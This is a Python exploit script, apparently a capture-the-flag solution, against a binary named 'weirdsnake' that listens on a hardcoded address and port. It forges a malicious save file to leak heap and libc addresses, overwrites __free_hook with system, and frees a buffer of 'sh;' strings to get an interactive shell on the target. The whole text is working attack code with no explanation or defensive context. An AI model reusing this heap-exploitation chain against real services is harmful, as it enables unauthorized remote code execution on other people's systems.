import pwnbox,struct,sys
def pack(x,f="<I"):
  return struct.pack(f,x)
def unpack(x,f="<Q"):
  return struct.unpack(f,x)[0]
def copy(a,b,idx):
  for i in range(len(b)):
    a[idx+i] = b[i]

def toString(a):
  ret = ""
  for x in a:
    ret +=x
  return ret

SERVER=False
for n in range(0x1000):
  if not SERVER:
    p = pwnbox.pipe.ProcessPipe("./weirdsnake")
    main_arena_off=0x3c1b58
    system_off = 0x456d0
    free_hook_off = 0x3c3788
  else:
    p = pwnbox.pipe.SocketPipe("200.200.200.107",5959)
    main_arena_off=0x3c3b78
    system_off = 0x045390
    free_hook_off = 0x3c57a8

  p.read_until(":")
  p.write("A"*0x10+"\n")
  def change(offset,v1,v2):
    s = ["\x00",]*0x60
    copy(s,"SNKG",0)
    copy(s,pack(0x800),4)
    copy(s,pack(0x60),8)
    copy(s,"\x01",51)
    copy(s,chr(1),12) ##number

    save_file = toString(s)
    s2 = ([chr(v1),]*4+ [chr(v2),]*4)*41
    copy(s2,"\xaa\xbb\xcc\xdd",0)
    copy(s2,pack(0x1),40)
    copy(s2,pack(1),84)
    copy(s2,pack(0x100,"<H"),76) #<=0x190
    copy(s2,pack(0x40,"<H"),78) # <= 0x64
    copy(s2,pack((offset)&0xffffffff ),88)
    save_file += toString(s2)

    p.read_until(">")
    p.write("3\n")
    p.write(toString(save_file))
#change(-0x125,0x8c,0x88)

  change(-0x127-3,0x8c,0x88)
  for x in [4,1]:
    p.read_until(">")
    p.write(str(x)+"\n")
  p.read_until(":")
  leak = p.read_byte(8)
  if "1." in leak:
    p.close()
    continue
  heap =  unpack(leak.strip().ljust(8,"\x00"))
  print hex(heap)
  for x in [4,2]:
    p.read_until(">")
    p.write(str(x)+"\n")
  p.read_until(":")
  p.write(pack(heap-0x58,"<Q")+pack(0x4141,"<Q"))

  def get(adr):
    for x in [4,2]:
      p.read_until(">")
      p.write(str(x)+"\n")
    p.read_until(":")
    p.write(pack(adr-0x10,"<Q")+"\x00"*8*9+"\x01"+"\n")
    p.read_until(">")
    p.write("3\n")
    p.read_until(">")
    p.write("2\n")
    p.read_until("1. ")
    return p.read_until(">")[:-2]

  main_arena  = unpack(get(heap+0x358).ljust(8,"\x00"))
  libc = main_arena - main_arena_off
  system = libc+system_off
  free_hook = libc+free_hook_off

  def write(adr,v):
    p.write("4\n")
    p.read_until(">")
    p.write("4\n")
    p.read_until(">")
    p.write("2\n")
    p.read_until(":")
    p.write("\x00"*8*10+"\x00"*8+pack(adr,"<Q")+pack(0x4141,"<Q")+"sh;"*0x100+"\n")

    p.read_until(">")
    p.write("2\n")
    p.read_until(":")
    p.write(pack(v,"<Q").rstrip("\x00")+"\n")

  write(free_hook,system)
  p.read_until(">")
  p.write("3\n")
  p.read_until(">")
  p.write("1\n")
  p.write("p\n")
  p.interact()
  p.close()
